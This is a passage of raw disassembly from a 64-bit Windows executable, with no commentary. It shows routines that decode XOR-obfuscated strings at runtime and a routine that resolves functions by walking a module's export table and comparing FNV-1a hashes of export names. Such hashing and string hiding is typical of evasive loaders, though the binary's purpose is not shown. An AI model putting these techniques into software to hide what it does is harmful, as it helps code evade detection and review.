   1400040d5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400040da:	34 6f                	xor    $0x6f,%al
   1400040dc:	41 88 40 04          	mov    %al,0x4(%r8)
   1400040e0:	4c 8b c3             	mov    %rbx,%r8
   1400040e3:	48 83 3d a5 c4 01 00 	cmpq   $0xf,0x1c4a5(%rip)        # 0x140020590
   1400040ea:	0f 
   1400040eb:	b8 05 00 00 00       	mov    $0x5,%eax
   1400040f0:	4c 0f 47 05 80 c4 01 	cmova  0x1c480(%rip),%r8        # 0x140020578
   1400040f7:	00 
   1400040f8:	33 d2                	xor    %edx,%edx
   1400040fa:	48 f7 f1             	div    %rcx
   1400040fd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140004102:	34 72                	xor    $0x72,%al
   140004104:	41 88 40 05          	mov    %al,0x5(%r8)
   140004108:	4c 8b c3             	mov    %rbx,%r8
   14000410b:	48 83 3d 7d c4 01 00 	cmpq   $0xf,0x1c47d(%rip)        # 0x140020590
   140004112:	0f 
   140004113:	b8 06 00 00 00       	mov    $0x6,%eax
   140004118:	4c 0f 47 05 58 c4 01 	cmova  0x1c458(%rip),%r8        # 0x140020578
   14000411f:	00 
   140004120:	33 d2                	xor    %edx,%edx
   140004122:	48 f7 f1             	div    %rcx
   140004125:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000412a:	34 65                	xor    $0x65,%al
   14000412c:	41 88 40 06          	mov    %al,0x6(%r8)
   140004130:	4c 8b c3             	mov    %rbx,%r8
   140004133:	48 83 3d 55 c4 01 00 	cmpq   $0xf,0x1c455(%rip)        # 0x140020590
   14000413a:	0f 
   14000413b:	b8 07 00 00 00       	mov    $0x7,%eax
   140004140:	4c 0f 47 05 30 c4 01 	cmova  0x1c430(%rip),%r8        # 0x140020578
   140004147:	00 
   140004148:	33 d2                	xor    %edx,%edx
   14000414a:	48 f7 f1             	div    %rcx
   14000414d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140004152:	34 72                	xor    $0x72,%al
   140004154:	41 88 40 07          	mov    %al,0x7(%r8)
   140004158:	4c 8b c3             	mov    %rbx,%r8
   14000415b:	48 83 3d 2d c4 01 00 	cmpq   $0xf,0x1c42d(%rip)        # 0x140020590
   140004162:	0f 
   140004163:	b8 08 00 00 00       	mov    $0x8,%eax
   140004168:	4c 0f 47 05 08 c4 01 	cmova  0x1c408(%rip),%r8        # 0x140020578
   14000416f:	00 
   140004170:	33 d2                	xor    %edx,%edx
   140004172:	48 f7 f1             	div    %rcx
   140004175:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000417a:	34 2e                	xor    $0x2e,%al
   14000417c:	41 88 40 08          	mov    %al,0x8(%r8)
   140004180:	4c 8b c3             	mov    %rbx,%r8
   140004183:	48 83 3d 05 c4 01 00 	cmpq   $0xf,0x1c405(%rip)        # 0x140020590
   14000418a:	0f 
   14000418b:	b8 09 00 00 00       	mov    $0x9,%eax
   140004190:	4c 0f 47 05 e0 c3 01 	cmova  0x1c3e0(%rip),%r8        # 0x140020578
   140004197:	00 
   140004198:	33 d2                	xor    %edx,%edx
   14000419a:	48 f7 f1             	div    %rcx
   14000419d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400041a2:	34 65                	xor    $0x65,%al
   1400041a4:	41 88 40 09          	mov    %al,0x9(%r8)
   1400041a8:	4c 8b c3             	mov    %rbx,%r8
   1400041ab:	48 83 3d dd c3 01 00 	cmpq   $0xf,0x1c3dd(%rip)        # 0x140020590
   1400041b2:	0f 
   1400041b3:	b8 0a 00 00 00       	mov    $0xa,%eax
   1400041b8:	4c 0f 47 05 b8 c3 01 	cmova  0x1c3b8(%rip),%r8        # 0x140020578
   1400041bf:	00 
   1400041c0:	33 d2                	xor    %edx,%edx
   1400041c2:	48 f7 f1             	div    %rcx
   1400041c5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400041ca:	34 78                	xor    $0x78,%al
   1400041cc:	41 88 40 0a          	mov    %al,0xa(%r8)
   1400041d0:	4c 8b c3             	mov    %rbx,%r8
   1400041d3:	48 83 3d b5 c3 01 00 	cmpq   $0xf,0x1c3b5(%rip)        # 0x140020590
   1400041da:	0f 
   1400041db:	b8 0b 00 00 00       	mov    $0xb,%eax
   1400041e0:	4c 0f 47 05 90 c3 01 	cmova  0x1c390(%rip),%r8        # 0x140020578
   1400041e7:	00 
   1400041e8:	33 d2                	xor    %edx,%edx
   1400041ea:	48 f7 f1             	div    %rcx
   1400041ed:	48 8b c3             	mov    %rbx,%rax
   1400041f0:	42 0f b6 0c 0a       	movzbl (%rdx,%r9,1),%ecx
   1400041f5:	80 f1 65             	xor    $0x65,%cl
   1400041f8:	41 88 48 0b          	mov    %cl,0xb(%r8)
   1400041fc:	48 83 c4 30          	add    $0x30,%rsp
   140004200:	5b                   	pop    %rbx
   140004201:	c3                   	ret
   140004202:	cc                   	int3
   140004203:	cc                   	int3
   140004204:	cc                   	int3
   140004205:	cc                   	int3
   140004206:	cc                   	int3
   140004207:	cc                   	int3
   140004208:	cc                   	int3
   140004209:	cc                   	int3
   14000420a:	cc                   	int3
   14000420b:	cc                   	int3
   14000420c:	cc                   	int3
   14000420d:	cc                   	int3
   14000420e:	cc                   	int3
   14000420f:	cc                   	int3
   140004210:	40 53                	rex push %rbx
   140004212:	48 83 ec 30          	sub    $0x30,%rsp
   140004216:	48 8d 1d 9b c2 01 00 	lea    0x1c29b(%rip),%rbx        # 0x1400204b8
   14000421d:	ba 11 00 00 00       	mov    $0x11,%edx
   140004222:	48 8b cb             	mov    %rbx,%rcx
   140004225:	e8 36 22 00 00       	call   0x140006460
   14000422a:	4c 8d 0d b7 a6 00 00 	lea    0xa6b7(%rip),%r9        # 0x14000e8e8
   140004231:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140004238:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000423f:	00 
   140004240:	48 ff c1             	inc    %rcx
   140004243:	41 80 3c 09 00       	cmpb   $0x0,(%r9,%rcx,1)
   140004248:	75 f6                	jne    0x140004240
   14000424a:	48 83 3d 7e c2 01 00 	cmpq   $0xf,0x1c27e(%rip)        # 0x1400204d0
   140004251:	0f 
   140004252:	48 8b c3             	mov    %rbx,%rax
   140004255:	4c 8b c3             	mov    %rbx,%r8
   140004258:	48 0f 47 05 58 c2 01 	cmova  0x1c258(%rip),%rax        # 0x1400204b8
   14000425f:	00 
   140004260:	c6 00 3a             	movb   $0x3a,(%rax)
   140004263:	b8 01 00 00 00       	mov    $0x1,%eax
   140004268:	48 83 3d 60 c2 01 00 	cmpq   $0xf,0x1c260(%rip)        # 0x1400204d0
   14000426f:	0f 
   140004270:	4c 0f 47 05 40 c2 01 	cmova  0x1c240(%rip),%r8        # 0x1400204b8
   140004277:	00 
   140004278:	33 d2                	xor    %edx,%edx
   14000427a:	48 f7 f1             	div    %rcx
   14000427d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140004282:	34 5c                	xor    $0x5c,%al
   140004284:	41 88 40 01          	mov    %al,0x1(%r8)
   140004288:	4c 8b c3             	mov    %rbx,%r8
   14000428b:	48 83 3d 3d c2 01 00 	cmpq   $0xf,0x1c23d(%rip)        # 0x1400204d0
   140004292:	0f 
   140004293:	b8 02 00 00 00       	mov    $0x2,%eax
   140004298:	4c 0f 47 05 18 c2 01 	cmova  0x1c218(%rip),%r8        # 0x1400204b8
   14000429f:	00 
   1400042a0:	33 d2                	xor    %edx,%edx
   1400042a2:	48 f7 f1             	div    %rcx
   1400042a5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400042aa:	34 2e                	xor    $0x2e,%al
   1400042ac:	41 88 40 02          	mov    %al,0x2(%r8)
   1400042b0:	4c 8b c3             	mov    %rbx,%r8
   1400042b3:	48 83 3d 15 c2 01 00 	cmpq   $0xf,0x1c215(%rip)        # 0x1400204d0
   1400042ba:	0f 
   1400042bb:	b8 03 00 00 00       	mov    $0x3,%eax
   1400042c0:	4c 0f 47 05 f0 c1 01 	cmova  0x1c1f0(%rip),%r8        # 0x1400204b8
   1400042c7:	00 
   1400042c8:	33 d2                	xor    %edx,%edx
   1400042ca:	48 f7 f1             	div    %rcx
   1400042cd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400042d2:	34 5c                	xor    $0x5c,%al
   1400042d4:	41 88 40 03          	mov    %al,0x3(%r8)
   1400042d8:	4c 8b c3             	mov    %rbx,%r8
   1400042db:	48 83 3d ed c1 01 00 	cmpq   $0xf,0x1c1ed(%rip)        # 0x1400204d0
   1400042e2:	0f 
   1400042e3:	b8 04 00 00 00       	mov    $0x4,%eax
   1400042e8:	4c 0f 47 05 c8 c1 01 	cmova  0x1c1c8(%rip),%r8        # 0x1400204b8
   1400042ef:	00 
   1400042f0:	33 d2                	xor    %edx,%edx
   1400042f2:	48 f7 f1             	div    %rcx
   1400042f5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400042fa:	34 44                	xor    $0x44,%al
   1400042fc:	41 88 40 04          	mov    %al,0x4(%r8)
   140004300:	4c 8b c3             	mov    %rbx,%r8
   140004303:	48 83 3d c5 c1 01 00 	cmpq   $0xf,0x1c1c5(%rip)        # 0x1400204d0
   14000430a:	0f 
   14000430b:	b8 05 00 00 00       	mov    $0x5,%eax
   140004310:	4c 0f 47 05 a0 c1 01 	cmova  0x1c1a0(%rip),%r8        # 0x1400204b8
   140004317:	00 
   140004318:	33 d2                	xor    %edx,%edx
   14000431a:	48 f7 f1             	div    %rcx
   14000431d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140004322:	34 6f                	xor    $0x6f,%al
   140004324:	41 88 40 05          	mov    %al,0x5(%r8)
   140004328:	4c 8b c3             	mov    %rbx,%r8
   14000432b:	48 83 3d 9d c1 01 00 	cmpq   $0xf,0x1c19d(%rip)        # 0x1400204d0
   140004332:	0f 
   140004333:	b8 06 00 00 00       	mov    $0x6,%eax
   140004338:	4c 0f 47 05 78 c1 01 	cmova  0x1c178(%rip),%r8        # 0x1400204b8
   14000433f:	00 
   140004340:	33 d2                	xor    %edx,%edx
   140004342:	48 f7 f1             	div    %rcx
   140004345:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000434a:	34 73                	xor    $0x73,%al
   14000434c:	41 88 40 06          	mov    %al,0x6(%r8)
   140004350:	4c 8b c3             	mov    %rbx,%r8
   140004353:	48 83 3d 75 c1 01 00 	cmpq   $0xf,0x1c175(%rip)        # 0x1400204d0
   14000435a:	0f 
   14000435b:	b8 07 00 00 00       	mov    $0x7,%eax
   140004360:	4c 0f 47 05 50 c1 01 	cmova  0x1c150(%rip),%r8        # 0x1400204b8
   140004367:	00 
   140004368:	33 d2                	xor    %edx,%edx
   14000436a:	48 f7 f1             	div    %rcx
   14000436d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140004372:	34 4b                	xor    $0x4b,%al
   140004374:	41 88 40 07          	mov    %al,0x7(%r8)
   140004378:	4c 8b c3             	mov    %rbx,%r8
   14000437b:	48 83 3d 4d c1 01 00 	cmpq   $0xf,0x1c14d(%rip)        # 0x1400204d0
   140004382:	0f 
   140004383:	b8 08 00 00 00       	mov    $0x8,%eax
   140004388:	4c 0f 47 05 28 c1 01 	cmova  0x1c128(%rip),%r8        # 0x1400204b8
   14000438f:	00 
   140004390:	33 d2                	xor    %edx,%edx
   140004392:	48 f7 f1             	div    %rcx
   140004395:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000439a:	34 37                	xor    $0x37,%al
   14000439c:	41 88 40 08          	mov    %al,0x8(%r8)
   1400043a0:	4c 8b c3             	mov    %rbx,%r8
   1400043a3:	48 83 3d 25 c1 01 00 	cmpq   $0xf,0x1c125(%rip)        # 0x1400204d0
   1400043aa:	0f 
   1400043ab:	b8 09 00 00 00       	mov    $0x9,%eax
   1400043b0:	4c 0f 47 05 00 c1 01 	cmova  0x1c100(%rip),%r8        # 0x1400204b8
   1400043b7:	00 
   1400043b8:	33 d2                	xor    %edx,%edx
   1400043ba:	48 f7 f1             	div    %rcx
   1400043bd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400043c2:	34 52                	xor    $0x52,%al
   1400043c4:	41 88 40 09          	mov    %al,0x9(%r8)
   1400043c8:	4c 8b c3             	mov    %rbx,%r8
   1400043cb:	48 83 3d fd c0 01 00 	cmpq   $0xf,0x1c0fd(%rip)        # 0x1400204d0
   1400043d2:	0f 
   1400043d3:	b8 0a 00 00 00       	mov    $0xa,%eax
   1400043d8:	4c 0f 47 05 d8 c0 01 	cmova  0x1c0d8(%rip),%r8        # 0x1400204b8
   1400043df:	00 
   1400043e0:	33 d2                	xor    %edx,%edx
   1400043e2:	48 f7 f1             	div    %rcx
   1400043e5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400043ea:	34 4b                	xor    $0x4b,%al
   1400043ec:	41 88 40 0a          	mov    %al,0xa(%r8)
   1400043f0:	4c 8b c3             	mov    %rbx,%r8
   1400043f3:	48 83 3d d5 c0 01 00 	cmpq   $0xf,0x1c0d5(%rip)        # 0x1400204d0
   1400043fa:	0f 
   1400043fb:	b8 0b 00 00 00       	mov    $0xb,%eax
   140004400:	4c 0f 47 05 b0 c0 01 	cmova  0x1c0b0(%rip),%r8        # 0x1400204b8
   140004407:	00 
   140004408:	33 d2                	xor    %edx,%edx
   14000440a:	48 f7 f1             	div    %rcx
   14000440d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140004412:	34 53                	xor    $0x53,%al
   140004414:	41 88 40 0b          	mov    %al,0xb(%r8)
   140004418:	4c 8b c3             	mov    %rbx,%r8
   14000441b:	48 83 3d ad c0 01 00 	cmpq   $0xf,0x1c0ad(%rip)        # 0x1400204d0
   140004422:	0f 
   140004423:	b8 0c 00 00 00       	mov    $0xc,%eax
   140004428:	4c 0f 47 05 88 c0 01 	cmova  0x1c088(%rip),%r8        # 0x1400204b8
   14000442f:	00 
   140004430:	33 d2                	xor    %edx,%edx
   140004432:	48 f7 f1             	div    %rcx
   140004435:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000443a:	34 63                	xor    $0x63,%al
   14000443c:	41 88 40 0c          	mov    %al,0xc(%r8)
   140004440:	4c 8b c3             	mov    %rbx,%r8
   140004443:	48 83 3d 85 c0 01 00 	cmpq   $0xf,0x1c085(%rip)        # 0x1400204d0
   14000444a:	0f 
   14000444b:	b8 0d 00 00 00       	mov    $0xd,%eax
   140004450:	4c 0f 47 05 60 c0 01 	cmova  0x1c060(%rip),%r8        # 0x1400204b8
   140004457:	00 
   140004458:	33 d2                	xor    %edx,%edx
   14000445a:	48 f7 f1             	div    %rcx
   14000445d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140004462:	34 6e                	xor    $0x6e,%al
   140004464:	41 88 40 0d          	mov    %al,0xd(%r8)
   140004468:	4c 8b c3             	mov    %rbx,%r8
   14000446b:	48 83 3d 5d c0 01 00 	cmpq   $0xf,0x1c05d(%rip)        # 0x1400204d0
   140004472:	0f 
   140004473:	b8 0e 00 00 00       	mov    $0xe,%eax
   140004478:	4c 0f 47 05 38 c0 01 	cmova  0x1c038(%rip),%r8        # 0x1400204b8
   14000447f:	00 
   140004480:	33 d2                	xor    %edx,%edx
   140004482:	48 f7 f1             	div    %rcx
   140004485:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000448a:	34 44                	xor    $0x44,%al
   14000448c:	41 88 40 0e          	mov    %al,0xe(%r8)
   140004490:	4c 8b c3             	mov    %rbx,%r8
   140004493:	48 83 3d 35 c0 01 00 	cmpq   $0xf,0x1c035(%rip)        # 0x1400204d0
   14000449a:	0f 
   14000449b:	b8 0f 00 00 00       	mov    $0xf,%eax
   1400044a0:	4c 0f 47 05 10 c0 01 	cmova  0x1c010(%rip),%r8        # 0x1400204b8
   1400044a7:	00 
   1400044a8:	33 d2                	xor    %edx,%edx
   1400044aa:	48 f7 f1             	div    %rcx
   1400044ad:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400044b2:	34 72                	xor    $0x72,%al
   1400044b4:	41 88 40 0f          	mov    %al,0xf(%r8)
   1400044b8:	4c 8b c3             	mov    %rbx,%r8
   1400044bb:	48 83 3d 0d c0 01 00 	cmpq   $0xf,0x1c00d(%rip)        # 0x1400204d0
   1400044c2:	0f 
   1400044c3:	b8 10 00 00 00       	mov    $0x10,%eax
   1400044c8:	4c 0f 47 05 e8 bf 01 	cmova  0x1bfe8(%rip),%r8        # 0x1400204b8
   1400044cf:	00 
   1400044d0:	33 d2                	xor    %edx,%edx
   1400044d2:	48 f7 f1             	div    %rcx
   1400044d5:	48 8b c3             	mov    %rbx,%rax
   1400044d8:	42 0f b6 0c 0a       	movzbl (%rdx,%r9,1),%ecx
   1400044dd:	80 f1 76             	xor    $0x76,%cl
   1400044e0:	41 88 48 10          	mov    %cl,0x10(%r8)
   1400044e4:	48 83 c4 30          	add    $0x30,%rsp
   1400044e8:	5b                   	pop    %rbx
   1400044e9:	c3                   	ret
   1400044ea:	cc                   	int3
   1400044eb:	cc                   	int3
   1400044ec:	cc                   	int3
   1400044ed:	cc                   	int3
   1400044ee:	cc                   	int3
   1400044ef:	cc                   	int3
   1400044f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400044f5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400044fa:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400044ff:	8b da                	mov    %edx,%ebx
   140004501:	4c 8b d9             	mov    %rcx,%r11
   140004504:	48 85 c9             	test   %rcx,%rcx
   140004507:	74 7d                	je     0x140004586
   140004509:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   14000450d:	45 33 c9             	xor    %r9d,%r9d
   140004510:	44 8b 84 08 88 00 00 	mov    0x88(%rax,%rcx,1),%r8d
   140004517:	00 
   140004518:	41 8b 7c 08 1c       	mov    0x1c(%r8,%rcx,1),%edi
   14000451d:	45 8b 54 08 20       	mov    0x20(%r8,%rcx,1),%r10d
   140004522:	48 03 f9             	add    %rcx,%rdi
   140004525:	41 8b 74 08 24       	mov    0x24(%r8,%rcx,1),%esi
   14000452a:	4c 03 d1             	add    %rcx,%r10
   14000452d:	45 8b 44 08 18       	mov    0x18(%r8,%rcx,1),%r8d
   140004532:	48 03 f1             	add    %rcx,%rsi
   140004535:	45 85 c0             	test   %r8d,%r8d
   140004538:	74 4c                	je     0x140004586
   14000453a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004540:	41 8b 02             	mov    (%r10),%eax
   140004543:	ba c5 9d 1c 81       	mov    $0x811c9dc5,%edx
   140004548:	49 03 c3             	add    %r11,%rax
   14000454b:	0f b6 08             	movzbl (%rax),%ecx
   14000454e:	84 c9                	test   %cl,%cl
   140004550:	74 24                	je     0x140004576
   140004552:	0f 1f 40 00          	nopl   0x0(%rax)
   140004556:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000455d:	00 00 00 
   140004560:	0f be c9             	movsbl %cl,%ecx
   140004563:	48 8d 40 01          	lea    0x1(%rax),%rax
   140004567:	33 ca                	xor    %edx,%ecx
   140004569:	69 d1 93 01 00 01    	imul   $0x1000193,%ecx,%edx
   14000456f:	0f b6 08             	movzbl (%rax),%ecx
   140004572:	84 c9                	test   %cl,%cl
   140004574:	75 ea                	jne    0x140004560
   140004576:	3b d3                	cmp    %ebx,%edx
   140004578:	74 1e                	je     0x140004598
   14000457a:	41 ff c1             	inc    %r9d
   14000457d:	49 83 c2 04          	add    $0x4,%r10
   140004581:	45 3b c8             	cmp    %r8d,%r9d
   140004584:	72 ba                	jb     0x140004540
   140004586:	33 c0                	xor    %eax,%eax
   140004588:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   14000458d:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
   140004592:	48 8b 7c 24 18       	mov    0x18(%rsp),%rdi
   140004597:	c3                   	ret
   140004598:	42 0f b7 0c 4e       	movzwl (%rsi,%r9,2),%ecx
   14000459d:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   1400045a2:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
   1400045a7:	8b 04 8f             	mov    (%rdi,%rcx,4),%eax
   1400045aa:	48 8b 7c 24 18       	mov    0x18(%rsp),%rdi
   1400045af:	49 03 c3             	add    %r11,%rax
   1400045b2:	c3                   	ret
   1400045b3:	cc                   	int3
   1400045b4:	cc                   	int3
   1400045b5:	cc                   	int3
   1400045b6:	cc                   	int3
   1400045b7:	cc                   	int3
   1400045b8:	cc                   	int3
   1400045b9:	cc                   	int3
   1400045ba:	cc                   	int3
   1400045bb:	cc                   	int3
   1400045bc:	cc                   	int3
   1400045bd:	cc                   	int3
   1400045be:	cc                   	int3
   1400045bf:	cc                   	int3
   1400045c0:	48 8b c4             	mov    %rsp,%rax
   1400045c3:	48 89 58 18          	mov    %rbx,0x18(%rax)
   1400045c7:	55                   	push   %rbp
   1400045c8:	56                   	push   %rsi
   1400045c9:	57                   	push   %rdi
   1400045ca:	41 54                	push   %r12
   1400045cc:	41 55                	push   %r13
   1400045ce:	41 56                	push   %r14
   1400045d0:	41 57                	push   %r15
   1400045d2:	48 8d a8 a8 fd ff ff 	lea    -0x258(%rax),%rbp
   1400045d9:	48 81 ec 20 03 00 00 	sub    $0x320,%rsp
   1400045e0:	0f 29 70 b8          	movaps %xmm6,-0x48(%rax)
   1400045e4:	0f 29 78 a8          	movaps %xmm7,-0x58(%rax)
   1400045e8:	48 8b 05 51 da 00 00 	mov    0xda51(%rip),%rax        # 0x140012040
   1400045ef:	48 33 c4             	xor    %rsp,%rax
   1400045f2:	48 89 85 f0 01 00 00 	mov    %rax,0x1f0(%rbp)
   1400045f9:	45 8b f9             	mov    %r9d,%r15d
   1400045fc:	4c 8b e2             	mov    %rdx,%r12
   1400045ff:	48 8b f9             	mov    %rcx,%rdi
   140004602:	48 89 4d a0          	mov    %rcx,-0x60(%rbp)
   140004606:	45 33 ed             	xor    %r13d,%r13d
   140004609:	44 89 6c 24 50       	mov    %r13d,0x50(%rsp)
   14000460e:	48 8b f1             	mov    %rcx,%rsi
   140004611:	48 83 79 18 0f       	cmpq   $0xf,0x18(%rcx)
   140004616:	76 03                	jbe    0x14000461b
   140004618:	48 8b 31             	mov    (%rcx),%rsi
   14000461b:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   14000461f:	48 85 c9             	test   %rcx,%rcx
   140004622:	74 75                	je     0x140004699
   140004624:	48 ff c9             	dec    %rcx
   140004627:	48 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%rbx
   14000462e:	48 3b cb             	cmp    %rbx,%rcx
   140004631:	48 0f 42 d9          	cmovb  %rcx,%rbx
   140004635:	48 ff c3             	inc    %rbx
   140004638:	48 03 de             	add    %rsi,%rbx
   14000463b:	41 b0 2e             	mov    $0x2e,%r8b
   14000463e:	48 8b d3             	mov    %rbx,%rdx
   140004641:	48 8b ce             	mov    %rsi,%rcx
   140004644:	e8 d7 50 00 00       	call   0x140009720
   140004649:	4c 8b c0             	mov    %rax,%r8
   14000464c:	48 3b c3             	cmp    %rbx,%rax
   14000464f:	74 48                	je     0x140004699
   140004651:	4c 2b c6             	sub    %rsi,%r8
   140004654:	49 83 f8 ff          	cmp    $0xffffffffffffffff,%r8
   140004658:	74 3f                	je     0x140004699
   14000465a:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000465d:	0f 11 44 24 78       	movups %xmm0,0x78(%rsp)
   140004662:	0f 57 c9             	xorps  %xmm1,%xmm1
   140004665:	f3 0f 7f 4d 88       	movdqu %xmm1,-0x78(%rbp)
   14000466a:	4c 39 47 10          	cmp    %r8,0x10(%rdi)
   14000466e:	4c 0f 42 47 10       	cmovb  0x10(%rdi),%r8
   140004673:	48 8b d7             	mov    %rdi,%rdx
   140004676:	48 83 7f 18 0f       	cmpq   $0xf,0x18(%rdi)
   14000467b:	76 03                	jbe    0x140004680
   14000467d:	48 8b 17             	mov    (%rdi),%rdx
   140004680:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   140004685:	e8 a6 34 00 00       	call   0x140007b30
   14000468a:	48 8d 44 24 78       	lea    0x78(%rsp),%rax
   14000468f:	bb 81 00 00 00       	mov    $0x81,%ebx
   140004694:	e9 ec 00 00 00       	jmp    0x140004785
   140004699:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000469c:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   1400046a1:	4c 8b f7             	mov    %rdi,%r14
   1400046a4:	48 83 7f 18 0f       	cmpq   $0xf,0x18(%rdi)
   1400046a9:	76 03                	jbe    0x1400046ae
   1400046ab:	4c 8b 37             	mov    (%rdi),%r14
   1400046ae:	48 8b 77 10          	mov    0x10(%rdi),%rsi
   1400046b2:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   1400046b9:	ff ff 7f 
   1400046bc:	48 3b f3             	cmp    %rbx,%rsi
   1400046bf:	0f 87 eb 07 00 00    	ja     0x140004eb0
   1400046c5:	48 83 fe 0f          	cmp    $0xf,%rsi
   1400046c9:	77 1c                	ja     0x1400046e7
   1400046cb:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   1400046d0:	48 c7 44 24 48 0f 00 	movq   $0xf,0x48(%rsp)
   1400046d7:	00 00 
   1400046d9:	41 0f 10 06          	movups (%r14),%xmm0
   1400046dd:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   1400046e2:	e9 94 00 00 00       	jmp    0x14000477b
   1400046e7:	48 8b c6             	mov    %rsi,%rax
   1400046ea:	48 83 c8 0f          	or     $0xf,%rax
   1400046ee:	48 3b c3             	cmp    %rbx,%rax
   1400046f1:	76 30                	jbe    0x140004723
   1400046f3:	48 b8 00 00 00 00 00 	movabs $0x8000000000000000,%rax
   1400046fa:	00 00 80 
   1400046fd:	48 83 c0 27          	add    $0x27,%rax
   140004701:	48 8b c8             	mov    %rax,%rcx
   140004704:	e8 17 41 00 00       	call   0x140008820
   140004709:	48 8b c8             	mov    %rax,%rcx
   14000470c:	48 85 c0             	test   %rax,%rax
   14000470f:	0f 84 f0 06 00 00    	je     0x140004e05
   140004715:	48 83 c0 27          	add    $0x27,%rax
   140004719:	48 83 e0 e0          	and    $0xffffffffffffffe0,%rax
   14000471d:	48 89 48 f8          	mov    %rcx,-0x8(%rax)
   140004721:	eb 3a                	jmp    0x14000475d
   140004723:	48 8b d8             	mov    %rax,%rbx
   140004726:	b9 16 00 00 00       	mov    $0x16,%ecx
   14000472b:	48 3b c1             	cmp    %rcx,%rax
   14000472e:	48 0f 42 d9          	cmovb  %rcx,%rbx
   140004732:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   140004736:	48 85 c9             	test   %rcx,%rcx
   140004739:	75 05                	jne    0x140004740
   14000473b:	49 8b c5             	mov    %r13,%rax
   14000473e:	eb 1d                	jmp    0x14000475d
   140004740:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140004747:	72 0f                	jb     0x140004758
   140004749:	48 8d 41 27          	lea    0x27(%rcx),%rax
   14000474d:	48 3b c1             	cmp    %rcx,%rax
   140004750:	0f 86 60 07 00 00    	jbe    0x140004eb6
   140004756:	eb a9                	jmp    0x140004701
   140004758:	e8 c3 40 00 00       	call   0x140008820
   14000475d:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140004762:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   140004767:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   14000476c:	4c 8d 46 01          	lea    0x1(%rsi),%r8
   140004770:	49 8b d6             	mov    %r14,%rdx
   140004773:	48 8b c8             	mov    %rax,%rcx
   140004776:	e8 10 50 00 00       	call   0x14000978b
   14000477b:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140004780:	bb 02 00 00 00       	mov    $0x2,%ebx
   140004785:	0f 10 38             	movups (%rax),%xmm7
   140004788:	0f 11 bd e0 00 00 00 	movups %xmm7,0xe0(%rbp)
   14000478f:	0f 10 70 10          	movups 0x10(%rax),%xmm6
   140004793:	0f 11 b5 f0 00 00 00 	movups %xmm6,0xf0(%rbp)
   14000479a:	4c 89 68 10          	mov    %r13,0x10(%rax)
   14000479e:	48 c7 40 18 0f 00 00 	movq   $0xf,0x18(%rax)
   1400047a5:	00 
   1400047a6:	c6 00 00             	movb   $0x0,(%rax)
   1400047a9:	f6 c3 02             	test   $0x2,%bl
   1400047ac:	74 53                	je     0x140004801
   1400047ae:	83 e3 fd             	and    $0xfffffffd,%ebx
   1400047b1:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   1400047b6:	48 83 fa 0f          	cmp    $0xf,%rdx
   1400047ba:	76 45                	jbe    0x140004801
   1400047bc:	48 ff c2             	inc    %rdx
   1400047bf:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1400047c4:	48 8b c1             	mov    %rcx,%rax
   1400047c7:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400047ce:	72 2b                	jb     0x1400047fb
   1400047d0:	48 83 c2 27          	add    $0x27,%rdx
   1400047d4:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1400047d8:	48 2b c1             	sub    %rcx,%rax
   1400047db:	48 83 e8 08          	sub    $0x8,%rax
   1400047df:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400047e3:	76 16                	jbe    0x1400047fb
